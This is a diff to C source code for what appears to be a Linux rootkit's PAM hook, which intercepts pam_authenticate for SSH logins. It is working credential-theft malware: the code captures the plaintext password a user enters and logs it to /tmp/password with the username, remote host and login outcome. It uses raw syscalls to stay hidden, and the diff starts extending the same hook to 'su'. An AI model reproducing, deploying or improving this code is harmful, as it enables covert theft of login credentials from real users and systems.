@@ -3,7 +3,7 @@ extern int      fd;
 extern uint8_t  sshd;
 extern char     buf[ SIZE_BUF ];
 
-struct pam_response *pam_get_password(pam_handle_t *pamh, char __attribute__((unused))*user, int __attribute__((unused))rkadmin)
+struct pam_response *pam_get_password(pam_handle_t *pamh, char __attribute__((unused))*user, int __attribute__((unused))rkadmin, const char *prompt )
 {
 	struct pam_message msg;
 	struct pam_response *pam_resp = NULL;
@@ -19,7 +19,7 @@ struct pam_response *pam_get_password(pam_handle_t *pamh, char __attribute__((un
 		return ( NULL );
 
 	msg.msg_style = 1;
-	msg.msg = "Password: ";
+	msg.msg = prompt;
 	pmsg = &msg;
 	conv->conv(1, &pmsg, &pam_resp, conv->appdata_ptr);
 	return (pam_resp);
@@ -27,7 +27,7 @@ struct pam_response *pam_get_password(pam_handle_t *pamh, char __attribute__((un
 
 int pam_authenticate(pam_handle_t *pamh, int flags )
 {
-    char    *service = NULL;
+    const char *service = NULL, *host = NULL, *user = NULL;
 	static int ( *orig_pam_authenticate ) ( pam_handle_t *, int  ) = NULL;
 	if ( ! orig_pam_authenticate )
 		orig_pam_authenticate = ( int (*) ( pam_handle_t *, int )) dlsym ( RTLD_NEXT, "pam_authenticate");
@@ -36,28 +36,19 @@ int pam_authenticate(pam_handle_t *pamh, int flags )
     int err = pam_get_item( pamh, PAM_SERVICE, ( void *)&service);
     if ( err == PAM_SUCCESS && _orBit_strcmp( service, service_sshd ) == 0 )
     {
-        const char *host = NULL, *user = NULL;
         if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
             return ( PAM_AUTH_ERR );
 
         if ( pam_get_item(pamh, PAM_RHOST, ( void * ) &host) != PAM_SUCCESS )
             return ( PAM_AUTH_ERR );
 	   
-        struct pam_response *pwd = pam_get_password(pamh, "", 0);
-        struct spwd *shadow_entry;
-        shadow_entry = getspnam( user );
-        if (shadow_entry == NULL)
-        {
-         // PAM_USER_UNKNOWN
-        }
+        struct pam_response *pwd = pam_get_password(pamh, "", 0, "Password: ");
         
-        char    *salt = strdup( shadow_entry->sp_pwdp );
-        char *tmp = _orBit_strchr( salt, '$');
-        *strrchr( tmp, '$') = 0;
-        char    *hash = crypt( pwd->resp, tmp );
-       
-        int res = _orBit_strcmp( hash, shadow_entry->sp_pwdp ) == 0 ? PAM_SUCCESS : PAM_AUTH_ERR;
-        int size = sprintf( buf, "%s:%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, ( res == 0 ) ? "SUCCESS" : "ERROR", hash );
+        uint8_t res = check_password( pwd, user );
+        // # If the condition is true, it means that a memory allocation error occurred in the function check_password.
+        if ( res == 1 )
+            return ( orig_pam_authenticate( pamh, flags ) );
+        int size = sprintf( buf, "%s:%s:%s:%s:%s\n", service, user, host, pwd->resp, ( res == 0 ) ? "SUCCESS" : "ERROR");
         const char  *filename = "/tmp/password";
 	    __asm__ volatile ("syscall" : "=a" (fd) : "a" (__NR_open ),
 		      "D" (filename), "S" (O_RDWR|O_APPEND|O_CREAT), "d" (0666) :
@@ -70,10 +61,14 @@ int pam_authenticate(pam_handle_t *pamh, int flags )
         __asm__ volatile ("syscall" : : "a" (__NR_close ),
 		      "D" ( fd ) :
 		      "cc", "memory", "rcx", "r11");
-       
-        ( salt ) ? free( salt ) : 0X00; 
         ( pwd != NULL ) ? free( pwd ) : 0X00;
         return ( res );
+    }
+    const char *service_su = "su";
+    if ( err == PAM_SUCCESS && _orBit_strcmp( service, service_su ) == 0 )
+    {
+        if ( pam_get_item(pamh, PAM_USER, ( void * ) &user ) != PAM_SUCCESS )
+            return ( PAM_AUTH_ERR );
     }
     return ( orig_pam_authenticate( pamh, flags ) );
 }
